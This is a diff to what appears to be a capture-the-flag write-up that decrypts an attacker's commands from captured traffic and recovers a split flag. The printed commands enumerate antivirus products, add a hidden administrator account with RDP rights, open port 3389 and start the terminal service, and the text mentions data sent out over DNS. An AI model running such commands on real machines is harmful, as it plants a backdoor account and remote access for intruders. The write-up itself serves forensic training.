@@ -224,7 +224,8 @@ $ciphertext_b64 = @(
     "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=",
     "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru",
     "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=",
-    "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A="
+    "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=",
+    "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
 )
 
 foreach($ct in $ciphertext_b64) {
@@ -241,6 +242,7 @@ ipconfig
 wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
 net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr
 netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
+net start TermService
 ```
 The password that the script gave it's user - `JHBhcnQxPSdIVEJ7eTB1X2M0bl8n` looked like it might be a base64 encoded flag in disguise, and... and it was, but only the first half.
 
@@ -464,6 +466,8 @@ The command completed successfully.  The command completed successfully.  The co
 ```
 Ok.
 ```
+
+I only found 6 groups of data transmitted via DNS queries, though there were 7 commands. Perhaps one of the commands didn't produce an output.
 
 And, in the largest of the encrypted command outputs we find the second half of the flag.
 
